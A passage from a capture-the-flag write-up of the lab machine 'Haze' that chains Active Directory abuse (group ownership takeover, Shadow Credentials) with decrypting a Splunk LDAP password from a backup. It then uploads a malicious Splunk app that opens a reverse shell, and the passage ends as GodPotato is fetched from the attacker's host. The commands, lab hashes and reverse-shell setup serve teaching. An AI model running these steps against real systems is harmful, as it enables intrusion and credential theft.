class="nt">-hashes</span> :4de830d1d58c14e241aff55f82ecdba1 <span class="go">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Saving ticket in Haze-IT-Backup$.ccache </span></code></pre></div></div> <p>I’ll use that with <code class="language-plaintext highlighter-rouge">bloodyAD</code> to set the owner of the group to be this account:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Haze-IT-Backup<span class="se">\$</span>.ccache bloodyAD <span class="nt">--host</span> dc01.haze.htb <span class="nt">-d</span> haze.htb <span class="nt">-u</span> <span class="s1">'Haze-IT-Backup$'</span> <span class="nt">-k</span> <span class="nb">set </span>owner Support_Services <span class="s1">'Haze-IT-Backup$'</span> <span class="go">[+] Old owner S-1-5-21-323145914-28650650-2368316563-512 is now replaced by Haze-IT-Backup$ on SUPPORT_SERVICES </span></code></pre></div></div> <p>As owner, I’ll give the account <code class="language-plaintext highlighter-rouge">GenericAll</code> over the group:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Haze-IT-Backup<span class="se">\$</span>.ccache bloodyAD <span class="nt">--host</span> dc01.haze.htb <span class="nt">-d</span> haze.htb <span class="nt">-u</span> <span class="s1">'Haze-IT-Backup$'</span> <span class="nt">-k</span> add genericAll Support_Services <span class="s1">'Haze-IT-Backup$'</span> <span class="go">[+] Haze-IT-Backup$ has now GenericAll on Support_Services </span></code></pre></div></div> <h3 id="bloodhound-2">Bloodhound</h3> <p>As an owner of the group, I’ll re-run Bloodhound. I wasn’t able to get Rusthound to work, so I’ll fall back to Python:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Haze-IT-Backup<span class="se">\$</span>.ccache bloodhound-ce-python <span class="nt">-d</span> haze.htb <span class="nt">-u</span> <span class="s1">'Haze-IT-Backup$'</span> <span class="nt">-k</span> <span class="go">-no-pass -c all -ns 10.10.11.61 --zip INFO: BloodHound.py for BloodHound Community Edition INFO: Found AD domain: haze.htb INFO: Using TGT from cache INFO: Found TGT with correct principal in ccache file. INFO: Connecting to LDAP server: dc01.haze.htb INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 1 computers INFO: Connecting to LDAP server: dc01.haze.htb INFO: Found 9 users INFO: Found 57 groups INFO: Found 2 gpos INFO: Found 2 ous INFO: Found 20 containers INFO: Found 0 trusts INFO: Starting computer enumeration with 10 workers INFO: Querying computer: dc01.haze.htb INFO: Done in 00M 17S INFO: Compressing output into 20250625013024_bloodhound.zip </span></code></pre></div></div> <p>In this new collection, Support_Services has some control over edward.martin:</p> <picture> <source type="image/webp" srcset="/img/image-20250624133227572.webp" /> <img loading="lazy" src="/img/image-20250624133227572.png" alt="image-20250624133227572" class="include_image " /> </picture> <h3 id="shadow-credentials">Shadow Credentials</h3> <h4 id="set-password-fail">Set Password Fail</h4> <p>I typically go for a Shadow Credential here over changing the password as it’s just cleaner OPSEC. That said, if I try to change the password here, it fails. I’ll add Haze-IT-Backup$ to the group, and then try to set the password:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Haze-IT-Backup<span class="se">\$</span>.ccache bloodyAD <span class="nt">--host</span> dc01.haze.htb <span class="nt">-d</span> haze.htb <span class="nt">-u</span> <span class="s1">'Haze-IT-Backup$'</span> <span class="nt">-k</span> add groupMember Support_Services <span class="s1">'Haze-IT-Backup$'</span> <span class="gp">[+] Haze-IT-Backup$</span><span class="w"> </span>added to Support_Services <span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Haze-IT-Backup<span class="se">\$</span>.ccache bloodyAD <span class="nt">--host</span> dc01.haze.htb <span class="nt">-d</span> haze.htb <span class="nt">-u</span> <span class="s1">'Haze-IT-Backup$'</span> <span class="nt">-k</span> <span class="nb">set </span>password edward.martin <span class="s1">'0xdf0xdf!!!'</span> <span class="go">Traceback (most recent call last): ...[snip]... msldap.commons.exceptions.LDAPModifyException: Password can't be changed before -2 days, 2:59:25.821606 because of the minimum password age policy. </span></code></pre></div></div> <p>The password age policy isn’t letting me change it.</p> <h4 id="shadow-credential">Shadow Credential</h4> <p>Instead of setting the password, I’ll use a Shadow Credential. I typically go this way anyway. After adding the Haze-IT-Backup$ account to the Support Services group, I’ll use <code class="language-plaintext highlighter-rouge">certipy</code> to set the credential:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>getTGT.py haze.htb/Haze-IT-Backup<span class="se">\$</span> <span class="nt">-hashes</span> :4de830d1d58c14e241aff55f82ecdba1 <span class="go">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Saving ticket in Haze-IT-Backup$.ccache </span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Haze-IT-Backup<span class="se">\$</span>.ccache certipy shadow auto <span class="nt">-username</span> <span class="s1">'Haze-IT-Backup$'</span> <span class="nt">-account</span> edward.martin <span class="nt">-k</span> <span class="nt">-target</span> dc01.haze.htb <span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k) [!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail [!] DNS resolution failed: The DNS query name does not exist: dc01.haze.htb. [!] Use -debug to print a stacktrace [!] DNS resolution failed: The DNS query name does not exist: HAZE.HTB. [!] Use -debug to print a stacktrace [*] Targeting user 'edward.martin' [*] Generating certificate [*] Certificate generated [*] Generating Key Credential [*] Key Credential generated with DeviceID 'd9ffe20dccd64735b0ddbd56c80d1937' [*] Adding Key Credential with device ID 'd9ffe20dccd64735b0ddbd56c80d1937' to the Key Credentials for 'edward.martin' [*] Successfully added Key Credential with device ID 'd9ffe20dccd64735b0ddbd56c80d1937' to the Key Credentials for 'edward.martin' [*] Authenticating as 'edward.martin' with the certificate [*] Certificate identities: [*] No identities found in this certificate [*] Using principal: 'edward.martin@haze.htb' [*] Trying to get TGT... [*] Got TGT [*] Saving credential cache to 'edward.martin.ccache' [*] Wrote credential cache to 'edward.martin.ccache' [*] Trying to retrieve NT hash for 'edward.martin' [*] Restoring the old Key Credentials for 'edward.martin' [*] Successfully restored the old Key Credentials for 'edward.martin' [*] NT hash for 'edward.martin': 09e0b3eeb2e7a6b0d419e9ff8f4d91af </span></code></pre></div></div> <p>This gives both a TGT and the NTLM hash for edward.martin.</p> <p>It’s important to get a new TGT first, as the old one doesn’t have that Haze-IT-Backup$ is in the Support_Services group. If I don’t get a new TGT, it’ll show this error:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Haze-IT-Backup<span class="se">\$</span>.ccache certipy shadow auto <span class="nt">-username</span> <span class="s1">'Haze-IT-Backup$'</span> <span class="nt">-account</span> edward.martin <span class="nt">-k</span> <span class="nt">-target</span> dc01.haze.htb <span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k) [!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail [!] DNS resolution failed: The DNS query name does not exist: dc01.haze.htb. [!] Use -debug to print a stacktrace [!] DNS resolution failed: The DNS query name does not exist: HAZE.HTB. [!] Use -debug to print a stacktrace [*] Targeting user 'edward.martin' [*] Generating certificate [*] Certificate generated [*] Generating Key Credential [*] Key Credential generated with DeviceID 'e9ba7063a082411d9f4bbebf54e1dcf5' [*] Adding Key Credential with device ID 'e9ba7063a082411d9f4bbebf54e1dcf5' to the Key Credentials for 'edward.martin' [-] Could not update Key Credentials for 'edward.martin' due to insufficient access rights: 00002098: SecErr: DSID-031514B3, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0 </span></code></pre></div></div> <p>That hash works:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb dc01.haze.htb <span class="nt">-u</span> edward.martin <span class="nt">-H</span> 09e0b3eeb2e7a6b0d419e9ff8f4d91af <span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> haze.htb\edward.martin:09e0b3eeb2e7a6b0d419e9ff8f4d91af </span></code></pre></div></div> <p>And edward.martin can WinRM:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec winrm dc01.haze.htb <span class="nt">-u</span> edward.martin <span class="nt">-H</span> 09e0b3eeb2e7a6b0d419e9ff8f4d91af <span class="netexec-protocol">WINRM </span><span class="go"> 10.10.11.61 5985 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb) </span><span class="netexec-protocol">WINRM </span><span class="go"> 10.10.11.61 5985 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> haze.htb\edward.martin:09e0b3eeb2e7a6b0d419e9ff8f4d91af </span><span class="netexec-pwned">(Pwn3d!)</span><span class="go"> </span></code></pre></div></div> <p>I’ll get a shell and <code class="language-plaintext highlighter-rouge">user.txt</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="n">evil-winrm-py</span><span class="w"> </span><span class="nt">-i</span><span class="w"> </span><span class="nx">dc01.haze.htb</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">edward.martin</span><span class="w"> </span><span class="nt">-H</span><span class="w"> </span><span class="nx">09e0b3eeb2e7a6b0d419e9ff8f4d91af</span><span class="w"> </span><span class="go"> ▘▜ ▘ █▌▌▌▌▐ ▄▖▌▌▌▌▛▌▛▘▛▛▌▄▖▛▌▌▌ ▙▖▚▘▌▐▖ ▚▚▘▌▌▌▌ ▌▌▌ ▙▌▙▌ ▌ ▄▌ v1.1.1 [*] Connecting to dc01.haze.htb:5985 as edward.martin </span><span class="gp">evil-winrm-py PS C:\Users\edward.martin\Documents&gt;</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="o">..</span><span class="nx">\Desktop</span><span class="w"> </span><span class="gp">evil-winrm-py PS C:\Users\edward.martin\Desktop&gt;</span><span class="w"> </span><span class="kr">type</span><span class="w"> </span><span class="n">user.txt</span><span class="w"> </span><span class="go">24bcc3d9************************ </span></code></pre></div></div> <h2 id="shell-as-alexandergreen">Shell as alexander.green</h2> <h3 id="enumeration-3">Enumeration</h3> <h4 id="find-backup">Find Backup</h4> <p>edward.martin is a member of the Backup_Reviewers group:</p> <picture> <source type="image/webp" srcset="/img/image-20250624142317391.webp" /> <img loading="lazy" src="/img/image-20250624142317391.png" alt="image-20250624142317391" class="include_image " /> </picture> <p>This shows up in the shell as well:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">evil-winrm-py PS C:\&gt;</span><span class="w"> </span><span class="n">whoami</span><span class="w"> </span><span class="nx">/groups</span><span class="w"> </span><span class="go"> GROUP INFORMATION ----------------- Group Name Type SID Attributes =========================================== ================ =========================================== ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled group BUILTIN\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group BUILTIN\Certificate Service DCOM Access Alias S-1-5-32-574 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group HAZE\Backup_Reviewers Group S-1-5-21-323145914-28650650-2368316563-1109 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\Medium Plus Mandatory Level Label S-1-16-8448 </span></code></pre></div></div> <p>There’s no obvious control from this group in Bloodhound, but I did notice <code class="language-plaintext highlighter-rouge">C:\Backups</code> earlier. edward.martin can access it:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">evil-winrm-py PS C:\Backups&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="go"> Directory: C:\Backups Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 3/5/2025 12:33 AM Splunk </span></code></pre></div></div> <p>The only file is a zip archive:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">evil-winrm-py PS C:\Backups\Splunk&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="go"> Directory: C:\Backups\Splunk Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 8/6/2024 3:22 PM 27445566 splunk_backup_2024-08-06.zip </span></code></pre></div></div> <p>I’ll download it:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">evil-winrm-py PS C:\Backups\Splunk&gt;</span><span class="w"> </span><span class="n">download</span><span class="w"> </span><span class="nx">splunk_backup_2024-08-06.zip</span><span class="w"> </span><span class="nx">splunk_backup_2024-08-06.zip</span><span class="w"> </span><span class="go">Downloading C:\Backups\Splunk\splunk_backup_2024-08-06.zip: 26.2MB [00:31, 860kB/s] [+] File downloaded successfully and saved as: /media/sf_CTFs/hackthebox/haze-10.10.11.61/splunk_backup_2024-08-06.zip </span></code></pre></div></div> <h4 id="splunk_backup_2024-08-06zip">splunk_backup_2024-08-06.zip</h4> <p>Unzipping the archive creates a <code class="language-plaintext highlighter-rouge">Splunk</code> directory:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">ls </span>Splunk/ <span class="go">bin etc license-eula.txt Python-3.7 share var cmake lib openssl.cnf quarantined_files splunk-9.2.1-78803f08aabb-windows-64-manifest copyright.txt license-eula.rtf opt README-splunk.txt swidtag </span></code></pre></div></div> <p>The first thing to look for is hashes / encrypted passwords. Since they all seem to take the format <code class="language-plaintext highlighter-rouge">$[digit]$</code>, I’ll recursively <code class="language-plaintext highlighter-rouge">grep</code> for this:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span><span class="nb">grep</span> <span class="nt">-rP</span> <span class="s1">'\$[0-9]\$\S{15,}'</span> Splunk/ <span class="go">Splunk/etc/passwd::admin:$6$8FRibWS3pDNoVWHU$vTW2NYea7GiZoN0nE6asP6xQsec44MlcK2ZehY5RC4xeTAz4kVVcbCkQ9xBI2c7A8VPmajczPOBjcVgccXbr9/::Administrator:admin:changeme@example.com:::19934 Splunk/etc/system/README/user-seed.conf.example:HASHED_PASSWORD = $6$TOs.jXjSRTCsfPsw$2St.t9lH9fpXd9mCEmCizWbb67gMFfBIJU37QF8wsHKSGud1QNMCuUdWkD8IFSgCZr5.W6zkjmNACGhGafQZj1 Splunk/etc/system/README/outputs.conf.example:token=$1$/fRSBT+2APNAyCB7tlcgOyLnAtqAQFC8NI4TGA2wX4JHfN5d9g== Splunk/etc/system/README/inputs.conf.example:token = $7$ifQTPTzHD/BA8VgKvVcgO1KQAtr3N1C8S/1uK3nAKIE9dd9e9g== grep: Splunk/var/lib/splunk/_introspection/db/db_1722472316_1722471805_2/1722472316-1722471805-7069930062775889648.tsidx: binary file matches Splunk/var/run/splunk/confsnapshot/baseline_local/system/local/authentication.conf:bindDNpassword = $1$YDz8WfhoCWmf6aTRkA+QqUI= Splunk/var/run/splunk/confsnapshot/baseline_local/system/local/server.conf:pass4SymmKey = $7$u538ChVu1V7V9pXEWterpsj8mxzvVORn8UdnesMP0CHaarB03fSbow== Splunk/var/run/splunk/confsnapshot/baseline_local/system/local/server.conf:sslPassword = $7$C4l4wOYleflCKJRL9l/lBJJQEBeO16syuwmsDCwft11h7QPjPH8Bog== </span></code></pre></div></div> <p>There is a <code class="language-plaintext highlighter-rouge">splunk.secret</code> file, and it’s different from the live one:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>Splunk/etc/auth/splunk.secret <span class="go">CgL8i4HvEen3cCYOYZDBkuATi5WQuORBw9g4zp4pv5mpMcMF3sWKtaCWTX8Kc1BK3pb9HR13oJqHpvYLUZ.gIJIuYZCA/YNwbbI4fDkbpGD.8yX/8VPVTG22V5G5rDxO5qNzXSQIz3NBtFE6oPhVLAVOJ0EgCYGjuk.fgspXYUc9F24Q6P/QGB/XP8sLZ2h00FQYRmxaSUTAroHHz8fYIsChsea7GBRaolimfQLD7yWGefscTbuXOMJOrzr/6B </span></code></pre></div></div> <p>All three of the <code class="language-plaintext highlighter-rouge">$7$</code> blobs crash in <code class="language-plaintext highlighter-rouge">splunk-secrets</code>. For example::</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>splunksecrets splunk-decrypt <span class="nt">-S</span> Splunk/etc/auth/splunk.secret <span class="nt">--ciphertext</span> <span class="s1">'$7$C4l4wOYleflCKJRL9l/lBJJQEBeO16syuwmsDCwft11h7QPjPH8Bog=='</span> <span class="go">Traceback (most recent call last): File "/home/oxdf/.local/bin/splunksecrets", line 10, in &lt;module&gt; sys.exit(main()) ^^^^^^ File "/home/oxdf/.local/share/uv/tools/splunksecrets/lib/python3.12/site-packages/click/core.py", line 1442, in __call__ return self.main(*args, **kwargs) ^^^^^^^^^^^^^^^^^^^^^^^^^^ File "/home/oxdf/.local/share/uv/tools/splunksecrets/lib/python3.12/site-packages/click/core.py", line 1363, in main rv = self.invoke(ctx) ^^^^^^^^^^^^^^^^ File "/home/oxdf/.local/share/uv/tools/splunksecrets/lib/python3.12/site-packages/click/core.py", line 1830, in invoke return _process_result(sub_ctx.command.invoke(sub_ctx)) ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ File "/home/oxdf/.local/share/uv/tools/splunksecrets/lib/python3.12/site-packages/click/core.py", line 1226, in invoke return ctx.invoke(self.callback, **ctx.params) ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ File "/home/oxdf/.local/share/uv/tools/splunksecrets/lib/python3.12/site-packages/click/core.py", line 794, in invoke return callback(*args, **kwargs) ^^^^^^^^^^^^^^^^^^^^^^^^^ File "/home/oxdf/.local/share/uv/tools/splunksecrets/lib/python3.12/site-packages/splunksecrets/cli.py", line 196, in splunk_decrypt click.echo(decrypt(splunk_secret, ciphertext)) ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ File "/home/oxdf/.local/share/uv/tools/splunksecrets/lib/python3.12/site-packages/splunksecrets/splunk.py", line 70, in decrypt plaintext = decryptor.update(ciphertext).decode() ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ UnicodeDecodeError: 'utf-8' codec can't decode byte 0xbd in position 2: invalid start byte </span></code></pre></div></div> <p>They seem to come from example files anyway. I think this is not real data.</p> <p>The <code class="language-plaintext highlighter-rouge">authentication.conf</code> password is a <code class="language-plaintext highlighter-rouge">bindDNpassword</code>, just like where I found the useful password above.</p> <div class="language-ini highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nn">[default]</span> <span class="py">minPasswordLength</span> <span class="p">=</span> <span class="s">8</span> <span class="py">minPasswordUppercase</span> <span class="p">=</span> <span class="s">0</span> <span class="py">minPasswordLowercase</span> <span class="p">=</span> <span class="s">0</span> <span class="py">minPasswordSpecial</span> <span class="p">=</span> <span class="s">0</span> <span class="py">minPasswordDigit</span> <span class="p">=</span> <span class="s">0</span> <span class="nn">[Haze LDAP Auth]</span> <span class="py">SSLEnabled</span> <span class="p">=</span> <span class="s">0</span> <span class="py">anonymous_referrals</span> <span class="p">=</span> <span class="s">1</span> <span class="py">bindDN</span> <span class="p">=</span> <span class="s">CN=alexander.green,CN=Users,DC=haze,DC=htb</span> <span class="py">bindDNpassword</span> <span class="p">=</span> <span class="s">$1$YDz8WfhoCWmf6aTRkA+QqUI=</span> <span class="py">charset</span> <span class="p">=</span> <span class="s">utf8</span> <span class="py">emailAttribute</span> <span class="p">=</span> <span class="s">mail</span> <span class="py">enableRangeRetrieval</span> <span class="p">=</span> <span class="s">0</span> <span class="py">groupBaseDN</span> <span class="p">=</span> <span class="s">CN=Splunk_Admins,CN=Users,DC=haze,DC=htb</span> <span class="py">groupMappingAttribute</span> <span class="p">=</span> <span class="s">dn</span> <span class="py">groupMemberAttribute</span> <span class="p">=</span> <span class="s">member</span> <span class="py">groupNameAttribute</span> <span class="p">=</span> <span class="s">cn</span> <span class="py">host</span> <span class="p">=</span> <span class="s">dc01.haze.htb</span> <span class="py">nestedGroups</span> <span class="p">=</span> <span class="s">0</span> <span class="py">network_timeout</span> <span class="p">=</span> <span class="s">20</span> <span class="py">pagelimit</span> <span class="p">=</span> <span class="s">-1</span> <span class="py">port</span> <span class="p">=</span> <span class="s">389</span> <span class="py">realNameAttribute</span> <span class="p">=</span> <span class="s">cn</span> <span class="py">sizelimit</span> <span class="p">=</span> <span class="s">1000</span> <span class="py">timelimit</span> <span class="p">=</span> <span class="s">15</span> <span class="py">userBaseDN</span> <span class="p">=</span> <span class="s">CN=Users,DC=haze,DC=htb</span> <span class="py">userNameAttribute</span> <span class="p">=</span> <span class="s">samaccountname</span> <span class="nn">[authentication]</span> <span class="py">authSettings</span> <span class="p">=</span> <span class="s">Haze LDAP Auth</span> </code></pre></div></div> <p>This time, it’s <code class="language-plaintext highlighter-rouge">$1$</code>, an older Splunk format. The <code class="language-plaintext highlighter-rouge">splunk-legacy-decrypt</code> works here:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>splunksecrets splunk-legacy-decrypt <span class="nt">-S</span> Splunk/etc/auth/splunk.secret <span class="nt">--ciphertext</span> <span class="s1">'$1$YDz8WfhoCWmf6aTRkA+QqUI='</span> <span class="go">Sp1unkadmin@2k24 </span></code></pre></div></div> <p>That’s the password for alexander.green, who is in the Splunk_Admins group:</p> <picture> <source type="image/webp" srcset="/img/image-20250624165020517.webp" /> <img loading="lazy" src="/img/image-20250624165020517.png" alt="image-20250624165020517" class="include_image " /> </picture> <p>Unfortunately, this password does not work for alexander.green on Haze.</p> <h4 id="splunk-web">Splunk Web</h4> <p>The password does work to log into the website as the admin user:</p> <div style="position: relative;"> <picture> <source type="image/webp" srcset="/img/image-20250624162041984.webp" /> <img loading="lazy" src="/img/image-20250624162041984.png" alt="image-20250624162041984" style="max-height: 400px; object-fit: cover; object-position: top; width: -webkit-fill-available; mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px)); -webkit-mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px));" class="include_image " /> </picture> <a href="javascript:void(0)" onclick="click_expand_image(event)" style="position: absolute; bottom: 35px; right: 15px;" title="Click to expand for full content"><img src="/icons/expand.png" alt="expand" class="expand-contract" /></a> </div> <p>This account has admin role, as can be seen under Settings &gt; Users:</p> <p><a href="/img/image-20250624165239758.png"><img src="/img/image-20250624165239758.png" alt="image-20250624165239758" /><em>Click for full size image</em></a></p> <h3 id="malicious-app">Malicious App</h3> <h4 id="background-2">Background</h4> <p>Huntress has a nice post for 2023, <a href="https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence">Beware of Traitorware: Using Splunk for Persistence</a>. In this post, they walk through how to place files into the Splunk directory structure to get code running as the forwarder on a cron.</p> <p><a href="https://github.com/0xjpuff/reverse_shell_splunk">This repo</a> has a template for a malicious app that makes this even easier and is made to actually upload into Splunk as a fake app.</p> <h4 id="make-app">Make App</h4> <p>I’ll clone the repo:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>git clone https://github.com/0xjpuff/reverse_shell_splunk <span class="go">Cloning into 'reverse_shell_splunk'... remote: Enumerating objects: 23, done. remote: Total 23 (delta 0), reused 0 (delta 0), pack-reused 23 (from 1) Receiving objects: 100% (23/23), 5.16 KiB | 660.00 KiB/s, done. Resolving deltas: 100% (4/4), done. </span></code></pre></div></div> <p>I’ll edit <code class="language-plaintext highlighter-rouge">bin/run.ps1</code> to include my IP and port 443. <code class="language-plaintext highlighter-rouge">default/inputs.conf</code> has the configuration values to run <code class="language-plaintext highlighter-rouge">run.bat</code> every 10 seconds:</p> <div class="language-ini highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nn">[script://./bin/rev.py]</span> <span class="py">disabled</span> <span class="p">=</span> <span class="s">0 </span> <span class="py">interval</span> <span class="p">=</span> <span class="s">10 </span> <span class="py">sourcetype</span> <span class="p">=</span> <span class="s">pentest </span> <span class="nn">[script://.\bin\run.bat]</span> <span class="py">disabled</span> <span class="p">=</span> <span class="s">0</span> <span class="py">sourcetype</span> <span class="p">=</span> <span class="s">pentest</span> <span class="py">interval</span> <span class="p">=</span> <span class="s">10</span> </code></pre></div></div> <p>I don’t have to, but I’ll remove the section on <code class="language-plaintext highlighter-rouge">rev.py</code> since I won’t be using it here (it’s targeted for Linux installs). The <code class="language-plaintext highlighter-rouge">.bat</code> file just runs <code class="language-plaintext highlighter-rouge">run.ps1</code>:</p> <div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@ECHO <span class="kd">OFF</span> <span class="kd">PowerShell</span><span class="err">.exe</span> <span class="na">-exec </span><span class="kd">bypass</span> <span class="na">-w </span><span class="kd">hidden</span> <span class="na">-Command </span><span class="s2">"&amp; '</span><span class="vm">%~dpn0</span><span class="s2">.ps1'"</span> </code></pre></div></div> <p>I’ll compress the directory and rename it:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">tar</span> <span class="nt">-cvzf</span> 0xdf.tgz reverse_shell_splunk <span class="go">reverse_shell_splunk/ reverse_shell_splunk/default/ reverse_shell_splunk/default/inputs.conf reverse_shell_splunk/bin/ reverse_shell_splunk/bin/rev.py reverse_shell_splunk/bin/run.bat reverse_shell_splunk/bin/run.ps1 </span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">mv </span>0xdf.tgz 0xdf.spl </code></pre></div></div> <h4 id="shell-1">Shell</h4> <p>Under Apps &gt; Manage Apps, there’s an option at the top right to “Install app from file”, which presents a form:</p> <picture> <source type="image/webp" srcset="/img/image-20250624170929265.webp" /> <img loading="lazy" src="/img/image-20250624170929265.png" alt="image-20250624170929265" class="include_image " /> </picture> <p>I’ll give it <code class="language-plaintext highlighter-rouge">0xdf.spl</code>, and it uploads. Within a few seconds, I’ll get a reverse shell:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>rlwrap <span class="nt">-cAr</span> nc <span class="nt">-lnvp</span> 443 <span class="go">Listening on 0.0.0.0 443 Connection received on 10.10.11.61 62093 </span><span class="gp">PS C:\Windows\system32&gt;</span><span class="w"> </span><span class="nb">whoami</span> <span class="go">haze\alexander.green </span></code></pre></div></div> <h2 id="shell-as-system">Shell as System</h2> <h3 id="enumeration-4">Enumeration</h3> <p>My session as alexander.green has <code class="language-plaintext highlighter-rouge">SeImpresonatePrivilege</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Windows\system32&gt;</span><span class="w"> </span><span class="n">whoami</span><span class="w"> </span><span class="nx">/priv</span><span class="w"> </span><span class="go"> PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ========================================= ======== SeMachineAccountPrivilege Add workstations to domain Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled </span></code></pre></div></div> <p>That should be enough to get system.</p> <h3 id="godpotato">GodPotato</h3> <h4 id="poc-1">POC</h4> <p>I’ll grab the latest release of <a href="https://github.com/BeichenDream/GodPotato/releases/tag/V1.20">GodPotato</a> (NET4 version) and save it to my host, and host it with a Python webserver. I’ll fetch it to Haze:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\programdata&gt;</span><span class="w"> </span><span class="n">iwr</span><span class="w"> </span><span class="nx">http://10.10.14.6/GodPotato-NET4.exe</span><span class="w"> </span><span class="nt">-outfile</span><span class="w"> </span><span class="nx">GodPotato-NET4.exe</span><span class="w"> </span></code></pre></div></div> <p>As a quick test, I’ll run it with the example command:</p> <div class="language-console highlighter-rouge"><div 